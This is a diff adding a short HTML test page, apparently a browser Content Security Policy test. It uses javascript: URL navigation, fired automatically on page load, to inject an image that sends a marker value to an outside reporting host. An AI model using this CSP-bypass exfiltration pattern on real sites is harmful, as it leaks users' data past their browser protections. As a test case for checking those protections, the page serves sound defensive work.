@@ -1,0 +1,20 @@
+<html>
+<body>
+<button id="123" onclick="breakit1()">CSP TEST1</button>
+<button id="456" onclick="breakit2()">CSP TEST2</button>
+<script>
+    function breakit1(){
+        open("javascript:'<img src=https://adition.com/report/?leak=c971231>'","_self");
+    }
+
+    function breakit2(){
+
+        location.href="javascript:'<img src=https://adition.com/report/?leak=c971231>'";
+    }
+    window.addEventListener("load", function () {
+        document.getElementById("123").click();
+    })
+</script>
+
+</body>
+</html>
